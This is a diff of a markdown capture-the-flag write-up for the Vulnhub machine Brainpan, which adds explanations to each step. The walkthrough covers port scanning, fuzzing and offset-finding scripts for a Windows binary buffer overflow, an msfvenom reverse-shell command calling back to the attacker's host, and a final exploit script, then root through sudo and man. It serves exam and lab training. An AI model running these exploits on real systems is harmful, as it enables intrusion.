@@ -1,12 +1,24 @@
 # Brainpan
 
+![](img/Brainpan.png)
+
+Originally posted on **Vulnhub** by [superkojiman](https://www.vulnhub.com/entry/brainpan-1,51/)
+
+Brainpan is a vulnerable machine, highly recommended to complete before taking the OSCP exam due to the buffer overflow vulnerability that has to exploited.
+
+The vulnerable program is a Windows executable. 
+
+We will analyze and exploit it from our Kali Linux machine. 
+
 ## Enumeration
 
 ### `nmap` scan
 
+`nmap` reveals two open ports:
+
 ```bash
-$ nmap -min-rate 5000 --max-retries 1 -sV -oN brainpan.txt 10.10.161.202
-Nmap scan report for 10.10.161.202
+$ nmap -min-rate 5000 --max-retries 1 -sV -oN brainpan.txt 10.10.92.146
+Nmap scan report for 10.10.92.146
 Host is up (0.037s latency).
 Not shown: 998 closed ports
 PORT      STATE SERVICE VERSION
@@ -14,7 +26,7 @@ PORT      STATE SERVICE VERSION
 10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
 ```
 
-OS
+I couldn't figure out which OS is running on the target machine using [`nmap -O`](https://nmap.org/book/man-os-detection.html) so I pinged it and I assumed it was a Linux server because of the TTL value (See [default TTL (Time To Live) values of different OS](https://subinsb.com/default-device-ttl-values/)):
 
 ```
 $ ping -c3 10.10.92.146
@@ -36,7 +48,7 @@ rtt min/avg/max/mdev = 37.203/37.503/37.704/0.216 ms
 
 ![](img/brainpan-10000.png)
 
-`dirb`:
+`dirb` can help us to find a `/bin` directory on the web page:
 
 ```bash
 $ dirb http://$TARGET:10000 -o services/10000-http.txt
@@ -48,23 +60,27 @@ By The Dark Raver
 
 OUTPUT_FILE: services/10000-http.txt
 START_TIME: Sun Aug  1 18:09:55 2021
-URL_BASE: http://10.10.161.202:10000/
+URL_BASE: http://10.10.92.146:10000/
 WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
 
 -----------------
 
 GENERATED WORDS: 4612                                                          
 
----- Scanning URL: http://10.10.161.202:10000/ ----
-+ http://10.10.161.202:10000/bin (CODE:301|SIZE:0)                                                                                                          
-+ http://10.10.161.202:10000/index.html (CODE:200|SIZE:215)
+---- Scanning URL: http://10.10.92.146:10000/ ----
++ http://10.10.92.146:10000/bin (CODE:301|SIZE:0)                                                                                                          
++ http://10.10.92.146:10000/index.html (CODE:200|SIZE:215)
                                                                                                                                                             
 -----------------
 END_TIME: Sun Aug  1 18:15:39 2021
 DOWNLOADED: 4612 - FOUND: 2
 ```
 
-`file`:
+An executable called `brainpan.exe` can be downloaded from here:
+
+![](img/bin-directory.png)
+
+Using `file` tells us this a 32-bit Windows program:
 
 ```bash
 $ file brainpan.exe 
@@ -75,9 +91,19 @@ ____
 
 ## Exploitation
 
-### Fuzzing
+This executable is the same as the one on the port 9999 of the target machine.
+
+In order to run it from our Kali Linux machine, we'll be using `wine`:
 
 ![](img/wine.png)
+
+### Step 1: Fuzzing
+
+The program is waiting for password from the user input.
+
+During this first step called "fuzzing", we'll be sending a bunch of characters in order to crash the program. This will potentially reveals a buffer overflow vulnerability.
+
+I used the following script to do so: 
 
 ```python
 import socket
@@ -103,17 +129,29 @@ while True:
 
 ![](img/41414141.png)
 
+As we can see from the screenshots above, the program tried to access to the address **0x41414141** and crashed. 
+
 ![](img/wine-error.png)
+
+This means we successfully overwrite **EIP** and the program crashed after copying 529 bytes to the buffer. Since **0x41414141** is just the hexadecimal representation of **0xAAAA**.
 
 ![](img/debugger.png)
 
-### Finding the offset
+### Step 2: Finding the offset
+
+Now, we want to know: how much characters do we need at least to crash the program? 
+
+This amount is called the **offset**. In order to find it, we can rely on two Metasploit scripts (called `pattern_create.rb` and `pattern_offset.rb`) or simply go manually.   
 
 #### Method#1: `pattern_create` + `pattern_offset`
+
+- We create a pattern of 529 characters with `pattern_create.rb`:
 
 ```bash
 $ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 529 > pattern.txt
 ```
+
+- We send this pattern to our wine local instance of `brainpan.exe`:
 
 ```python
 import socket
@@ -131,7 +169,11 @@ s.send((b"                          >> " + buffer))
 s.close()
 ```
 
+- We inspect the value of `EIP`:
+
 ![](img/pattern.png)
+
+- We give this value to `pattern_offset.rb` to compute the exact number of characters needed to crash the program: 
 
 ```bash
 $ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x41357141
@@ -139,6 +181,8 @@ $ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x41357141
 ```
 
 #### Method#2: manually
+
+Since I saw the message _"529 bytes copied to buffer"_ on the debug console, I tried many values (525, 500, ...) until I found **495** was the exact offset.
 
 ```python
 import socket
@@ -156,11 +200,13 @@ s.send((b"                          >> " + buffer))
 s.close()
 ```
 
-Playing with `offset` value until `EIP`'s value is `42424242` 
+By placing `BBBB` at the end of my payload, I thought: _"I will find the offset after `EIP`'s value will be `42424242`"_:
 
 ![](img/42424242.png)
 
-### Identifying bad characters (`ollydbg`)
+### Step 3: Identifying bad characters (`ollydbg`)
+
+In order to generate a shellcode that will work, we have to identify the bad characters first:
 
 ```python
 import socket
@@ -181,19 +227,35 @@ s.send((b"                          >> " + buffer))
 s.close()
 ```
 
+To inspect the program's memory I attached the `brainpan` process to `ollydbg` on my Kali machine as follows:
+
 ![](img/follow-in-dump.png)
+
+All the characters are here (there are no bad characters):
 
 ![](img/dump.png)
 
-### Finding `JMP ESP`
+### Step 4: Finding `JMP ESP`
+
+Before continuing, we need to find a `jmp esp` instruction to redirect the execution flow at the start of our payload/shellcode.
+
+> [Why JMP ESP instead of directly jumping into the stack?](https://security.stackexchange.com/questions/157478/why-jmp-esp-instead-of-directly-jumping-into-the-stack)
 
 ![](img/ollydbg-search-for.png)
 
+Using `ollydbg`, I found the following address:
+
 ![](img/JMP_ESP.png)
+
+However, to ensure it was the correct address I ran `brainpan.exe` on a Windows VM and inspected it (as on this [video](https://www.youtube.com/watch?v=k9D9RuFT02I&list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G&index=7) using) **Immunity Debugger** and `mona.py`: 
 
 ![](img/mona-brainpan.png)
 
-### Generating shellcode
+The address I got was `0x311712F3`.
+
+### Step 5: Generating shellcode
+
+To generate a shellcode we can use `msfvenom`:
 
 ```bash
 $ msfvenom -p linux/x86/shell_reverse_tcp lhost=$(vpnip) lport=4444 --format python --bad-chars "\x00" --var-name shellcode
@@ -219,7 +281,7 @@ shellcode += b"\xdf\x95\xe0\x0e\xd4\x68\x62"
 
 > **Note**: First I thought the target was a Windows machine and I used a `windows/shell_reverse_tcp` payload. Surprisingly, it worked and I got a Windows shell (`Z:\home\puck>`)...very weird! (need to figure out)
 
-### Writing final exploit
+### Step 6: Writing final exploit 
 
 ```python
 import socket
@@ -253,7 +315,7 @@ except:
     print(f"Error connecting to the server...")
 ```
 
-And we got a shell:
+And we got a shell as **puck**:
 
 ![](img/shell2.png)
 
@@ -281,23 +343,17 @@ ___
 
 ![](img/sudo_l.png)
 
-```console
-puck@brainpan:/home$ cat /etc/os-release 
-NAME="Ubuntu"
-VERSION="12.10, Quantal Quetzal"
-ID=ubuntu
-ID_LIKE=debian
-PRETTY_NAME="Ubuntu quantal (12.10)"
-VERSION_ID="12.10"
-puck@brainpan:/home$ uname -a
-Linux brainpan 3.5.0-25-generic #39-Ubuntu SMP Mon Feb 25 19:02:34 UTC 2013 i686 i686 i686 GNU/Linux
-```
-
 ![](img/anansi_util.png)
+
+With the program that we can run with `sudo`, we can open manual pages. 
+
+The program certainly rely on the `man` command so I looked for **GTFOBins man** and this is what I found: 
 
 ![](img/gtfobins_man.png)
 
-![](img/privesc_payload.png.png)
+Indeed, it worked, we own root:
+
+![](img/privesc_payload.png)
 
 ![](img/privesc.png)
 
@@ -306,4 +362,6 @@ ___
 ## Useful resources
 
 - [The Cyber Mentor - Buffer Overflows Made Easy](https://www.youtube.com/playlist?list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G)
+- [Immunity Debugger](https://www.immunityinc.com/products/debugger/)
+- [Mona.py](https://github.com/corelan/mona/blob/master/mona.py)
 - [GTFOBins - man](https://gtfobins.github.io/gtfobins/man/)
